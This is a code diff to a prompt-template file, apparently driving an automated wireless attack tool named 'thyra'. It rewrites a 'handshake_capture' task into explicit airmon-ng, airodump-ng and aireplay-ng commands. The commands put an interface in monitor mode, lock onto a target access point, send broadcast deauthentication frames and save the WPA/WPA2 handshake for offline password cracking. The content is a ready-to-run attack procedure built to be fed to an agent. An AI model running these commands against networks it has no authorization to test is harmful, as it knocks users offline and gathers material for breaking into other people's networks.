@@ -244,8 +244,14 @@ Report: SSID, BSSID, channel, encryption, signal strength, client count.
 
     "handshake_capture": """
 Target AP: BSSID={bssid}, Channel={channel}
-Capture WPA/WPA2 4-way handshake for offline cracking. Enable monitor mode on wlan0, run airodump-ng locked to bssid/channel writing to /tmp/thyra_output/handshake, then send 3 deauth frames with aireplay-ng to trigger a handshake.
-Report: capture file path, client MACs seen.
+Capture WPA/WPA2 4-way handshake for offline cracking.
+Commands (airmon-ng renames wlan0 to wlan0mon after start):
+1. airmon-ng start wlan0
+2. airodump-ng --bssid {bssid} --channel {channel} --write /tmp/thyra_output/handshake wlan0mon
+3. aireplay-ng --deauth 3 -a {bssid} -c FF:FF:FF:FF:FF:FF wlan0mon
+4. airmon-ng stop wlan0mon
+Note: always use wlan0mon (not wlan0) for airodump-ng and aireplay-ng after airmon-ng start.
+Report: capture file path (/tmp/thyra_output/handshake-01.cap), client MACs seen.
 """,
 
     "spectrum_scan": """
